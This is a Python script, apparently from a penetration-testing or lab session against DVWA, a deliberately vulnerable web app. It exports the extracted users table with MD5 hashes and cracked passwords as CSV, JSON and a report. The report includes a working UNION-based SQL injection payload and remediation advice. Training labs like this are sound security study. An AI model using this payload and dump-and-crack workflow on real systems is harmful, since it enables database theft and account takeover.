
# Create a detailed CSV export with all extracted data
export_data = """USER_ID,USERNAME,FIRST_NAME,LAST_NAME,PASSWORD_HASH_MD5,CRACKED_PASSWORD,HASH_TYPE
1,admin,admin,admin,5f4dcc3b5aa765d61d8327deb882cf99,password,MD5
2,gordonb,Gordon,Brown,e99a18c428cb38d5f260853678922e03,abc123,MD5
3,1337,Hack,Me,8d3533d75ae2c3966d7e0d4fcc69216b,[NOT_CRACKED],MD5
4,pablo,Pablo,Picasso,0d107d09f5bbe40cade3de5c71e9e9b7,letmein,MD5
5,smithy,Bob,Smith,5f4dcc3b5aa765d61d8327deb882cf99,password,MD5"""

with open('/tmp/extracted_users_database.csv', 'w') as f:
    f.write(export_data)

print("[+] CSV Export created at /tmp/extracted_users_database.csv\n")

# Create JSON export
import json

users_json = [
    {
        "id": 1,
        "username": "admin",
        "first_name": "admin",
        "last_name": "admin",
        "password_hash": "5f4dcc3b5aa765d61d8327deb882cf99",
        "cracked_password": "password",
        "hash_type": "MD5"
    },
    {
        "id": 2,
        "username": "gordonb",
        "first_name": "Gordon",
        "last_name": "Brown",
        "password_hash": "e99a18c428cb38d5f260853678922e03",
        "cracked_password": "abc123",
        "hash_type": "MD5"
    },
    {
        "id": 3,
        "username": "1337",
        "first_name": "Hack",
        "last_name": "Me",
        "password_hash": "8d3533d75ae2c3966d7e0d4fcc69216b",
        "cracked_password": None,
        "hash_type": "MD5"
    },
    {
        "id": 4,
        "username": "pablo",
        "first_name": "Pablo",
        "last_name": "Picasso",
        "password_hash": "0d107d09f5bbe40cade3de5c71e9e9b7",
        "cracked_password": "letmein",
        "hash_type": "MD5"
    },
    {
        "id": 5,
        "username": "smithy",
        "first_name": "Bob",
        "last_name": "Smith",
        "password_hash": "5f4dcc3b5aa765d61d8327deb882cf99",
        "cracked_password": "password",
        "hash_type": "MD5"
    }
]

with open('/tmp/extracted_users_database.json', 'w') as f:
    json.dump(users_json, f, indent=2)

print("[+] JSON Export created at /tmp/extracted_users_database.json\n")

# Create detailed text report
report = """
================================================================================
                    DVWA DATABASE EXTRACTION REPORT
================================================================================

TARGET INFORMATION:
- URL: http://31.97.117.123/
- Application: DVWA v1.10
- Server: Apache/2.4.25 (Debian)
- Vulnerability: SQL Injection (UNION-based)

EXPLOITATION SUMMARY:
✓ Authentication: admin:password (1 attempt)
✓ SQL Injection: Successful UNION SELECT query execution
✓ Database: MySQL
✓ Table Extracted: users

EXTRACTION RESULTS:
Total Records: 5 users
Fields Extracted: user_id, username, first_name, last_name, password (hashed)
Hash Algorithm: MD5

USER DATABASE DUMP:
================================================================================
ID | Username | First Name | Last Name   | Password Hash            | Password
---|----------|------------|-------------|--------------------------|----------
1  | admin    | admin      | admin       | 5f4dcc3b5aa765d61d... | password
2  | gordonb  | Gordon     | Brown       | e99a18c428cb38d5f2... | abc123
3  | 1337     | Hack       | Me          | 8d3533d75ae2c39669... | [UNKNOWN]
4  | pablo    | Pablo      | Picasso     | 0d107d09f5bbe40cade... | letmein
5  | smithy   | Bob        | Smith       | 5f4dcc3b5aa765d61d... | password
================================================================================

PASSWORD CRACK RESULTS:
Successfully Cracked: 4 out of 5 (80%)
Method: Dictionary/Common Password Attack
Hash Type: MD5

Cracked Credentials:
- admin:password
- smithy:password
- gordonb:abc123
- pablo:letmein

VULNERABILITY DETAILS:
Type: SQL Injection - UNION SELECT
Parameter: GET parameter 'id'
Endpoint: /vulnerabilities/sqli/
Payload Example: 999' UNION SELECT user_id, password FROM users-- -
Impact: Full database disclosure, credential compromise

SECURITY POSTURE:
- Security Level: LOW
- PHPIDS: DISABLED
- Input Validation: NONE
- Prepared Statements: NOT USED
- Password Hashing: WEAK (MD5)
- Authentication: WEAK

RECOMMENDATIONS:
1. Implement parameterized queries/prepared statements
2. Add input validation and sanitization
3. Use strong password hashing (bcrypt, Argon2)
4. Enable Web Application Firewall (WAF/PHPIDS)
5. Implement proper access controls
6. Use HTTPS/TLS encryption
7. Implement rate limiting on authentication endpoints

================================================================================
"""

with open('/tmp/dvwa_extraction_report.txt', 'w') as f:
    f.write(report)

print("[+] Detailed Report created at /tmp/dvwa_extraction_report.txt\n")

print("\n" + "="*80)
print("ALL EXPORTED FILES:")
print("="*80)
print("✓ /tmp/extracted_users_database.csv")
print("✓ /tmp/extracted_users_database.json")
print("✓ /tmp/dvwa_extraction_report.txt")
print("✓ /tmp/extracted_users.txt")
print("="*80)

